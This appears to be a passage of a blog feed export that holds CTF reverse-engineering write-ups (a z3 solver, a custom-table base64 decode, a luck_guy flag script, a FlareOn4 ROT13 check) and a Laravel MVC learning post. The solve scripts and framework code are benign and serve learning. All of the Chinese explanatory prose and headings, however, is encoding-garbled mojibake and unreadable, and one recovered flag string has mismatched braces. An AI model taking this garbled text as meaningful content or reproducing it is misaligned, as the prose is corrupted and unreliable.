class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ¶‰åŠåˆ°çš„åŠ å¯†ç®—æ³•ï¼Œè‡ªå·±åœ¨å¹³æ¿ä¸Šæ¼”ç®—äº†ä¸€éï¼Œç›´æ¥ä»å°¾åˆ°å¤´å¼‚æˆ–å›å»å°±å¯ä»¥äº†<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>å‘ç°æ˜¯ä¸ªé™æ€ç¼–è¯‘çš„mipsæ–‡ä»¶ï¼Œé‡Œé¢è¿˜æœ‰ä¸€ä»½output.txtæ–‡ä»¶<br>æ”¾åˆ°ubuntu20.04é‡Œï¼Œä¸‹ä¸ªqemu-useræ¥è·‘ä¸€ä¸‹ï¼Œè¾“å…¥ä¹‹åå°±é€€å‡ºäº†</p><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç®—æ³•ï¼Œæ ¹æ®ç‰¹å¾è¯†åˆ«ä¸ºbase64æ¢è¡¨<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>è¿™é‡Œè¿˜æœ‰padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 æ¢è¡¨è§£å¯†å³å¯</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravelæ¡†æ¶å­¦ä¹ </title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"><a href="#äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹" class="headerlink" title="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"></a>äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹</h2><ul><li>ä½¿ç”¨æ¡†æ¶æ¥å®ç°ä¸€ä¸ªé€šè¿‡urlè®¿é—®ç”¨æˆ·é‚®ç®±çš„å°åŠŸèƒ½æ¥äº†è§£è·¯ç”±ï¼Œæ¨¡å‹å’Œè§†å›¾çš„å†™æ³•</li></ul><p>é¦–å…ˆåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸¤æ¡æ•°æ®<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>ä½¿ç”¨php artisanç”Ÿæˆæ¨¡å‹<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>é€šè¿‡æ–‡æ¡£å¾—çŸ¥å‘½åè§„èŒƒå¦‚ä¸‹</p><blockquote><p>æ•°æ®è¡¨åç§°<br>è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å‘Šè¯‰ Eloquent æˆ‘ä»¬çš„ Flight æ¨¡å‹ä½¿ç”¨å“ªä¸ªæ•°æ®è¡¨ã€‚ é™¤éæ˜ç¡®åœ°æŒ‡å®šäº†å…¶å®ƒåç§°ï¼Œå¦åˆ™å°†ä½¿ç”¨ç±»çš„å¤æ•°å½¢å¼ã€Œè›‡å½¢å‘½åã€æ¥ä½œä¸ºè¡¨åã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒEloquent å°†å‡è®¾ Flight æ¨¡å‹å­˜å‚¨çš„æ˜¯ flights æ•°æ®è¡¨ä¸­çš„æ•°æ®ï¼Œè€Œ AirTrafficController æ¨¡å‹ä¼šå°†è®°å½•å­˜å‚¨åœ¨ air_traffic_controllers è¡¨ä¸­ã€‚<br>ä½ å¯ä»¥é€šè¿‡åœ¨æ¨¡å‹ä¸Šå®šä¹‰ table å±æ€§æ¥æŒ‡å®šè‡ªå®šä¹‰æ•°æ®è¡¨ï¼š<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¸æ¨¡å‹å…³è”çš„è¡¨å</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ•°æ®è¡¨ä¸ºusertests,æ¨¡å‹ä¸ºUsertest</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒEloquent é¢„æœŸä½ çš„æ•°æ®è¡¨ä¸­å­˜åœ¨ created_at å’Œ updated_at ä¸¤ä¸ªå­—æ®µ ã€‚å¦‚æœä½ ä¸æƒ³è®© Eloquent è‡ªåŠ¨ç®¡ç†è¿™ä¸¤ä¸ªåˆ—ï¼Œ è¯·å°†æ¨¡å‹ä¸­çš„ $timestamps å±æ€§è®¾ç½®ä¸º falseï¼š</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ˜¯å¦ä¸»åŠ¨ç»´æŠ¤æ—¶é—´æˆ³</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-phpæ¨¡å‹ä»£ç "><a href="#Usertest-phpæ¨¡å‹ä»£ç " class="headerlink" title="Usertest.phpæ¨¡å‹ä»£ç "></a>Usertest.phpæ¨¡å‹ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-phpæ§åˆ¶å™¨ä»£ç "><a href="#PostTestController-phpæ§åˆ¶å™¨ä»£ç " class="headerlink" title="PostTestController.phpæ§åˆ¶å™¨ä»£ç "></a>PostTestController.phpæ§åˆ¶å™¨ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// ddè°ƒè¯•phpç¨‹åº</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¿®æ”¹äº†alexç”¨æˆ·çš„email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// returnè§†å›¾</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-phpè·¯ç”±ä»£ç "><a href="#web-phpè·¯ç”±ä»£ç " class="headerlink" title="web.phpè·¯ç”±ä»£ç "></a>web.phpè·¯ç”±ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-phpè§†å›¾ä»£ç "><a href="#posttest-blade-phpè§†å›¾ä»£ç " class="headerlink" title="posttest.blade.phpè§†å›¾ä»£ç "></a>posttest.blade.phpè§†å›¾ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> å¼€å‘å­¦ä¹  </tag>
            
            <tag> å¼€å‘æ¡†æ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverseé¢˜è§£1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elfæ–‡ä»¶ï¼Œ64ä½ï¼Œç›®æµ‹æ˜¯è¾“å…¥ä»€ä¹ˆlucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>ä¸ç®¡ä»–ï¼Œç›´æ¥ida f5å¤§æ³•<br>ä¸»è¦çš„å‡½æ•°å°±æ˜¯getflagè¿™ä¸ªå‡½æ•°<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>è®¾ç½®äº†éšæœºæ•°ï¼Œç„¶åswitchï¼Œæœ¬åœ°æµ‹è¯•åŸºæœ¬ä¸å¯èƒ½èµ°1-5åˆ†æ”¯<br>ç›®æµ‹ä¸€ä¸‹ï¼Œæ¯”è¾ƒåˆç†çš„æµç¨‹å°±æ˜¯451<br>4ä¸ºf2èµ‹å€¼<br>5æ”¹f2çš„å€¼<br>1æ‹¼æ¥f1å’Œf2<br>å…¶ä¸­f1åœ¨dataæ®µï¼Œæœ‰å­—ç¬¦ä¸²æ•°æ®ï¼Œf2åœ¨bssæœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µ<br>ç„¶åå°±èµ°è¿™ä¸ªæµç¨‹ï¼Œä¸€å¼€å§‹è„‘å­æŠ½äº†ï¼ŒæŒ‡é’ˆé‚£ä¸ªåœ°æ–¹è¯»é”™äº†ç„¶åå°±æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°<br>ç»“åˆæ±‡ç¼–æ¥è¯»ï¼Œå±€éƒ¨å˜é‡så…¶å®ä¸æ˜¯ä¸€ä¸ªlong longç±»å‹çš„æ•°æ®è€Œæ˜¯ä¸€ä¸ªå­—ç¬¦æ•°ç»„</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>ç„¶åæœ¬åœ°å†™ä¸ªè„šæœ¬ä¸€è¿è¡Œå°±å‡ºæ¥äº†<br>é™„ä¸Šæœ¬åœ°è°ƒè¯•çš„pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flagï¼Œä½†æ˜¯æ˜¯GXYå‰ç¼€ï¼Œæ¢ä¸Šctfå‰ç¼€äº¤ä¸Šæ‰å¯¹<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>ç­¾åˆ°é¢˜</p><p>æ„Ÿè§‰åƒä¸ªwin32çš„å°ç¨‹åº<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>æœå­—ç¬¦ä¸²å¤§æ³•<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>äº¤ä¸Šå°±å¯¹äº†555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>ä¸‹è½½ä¸‹æ¥å‘ç°æ˜¯htmlæ–‡ä»¶<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) 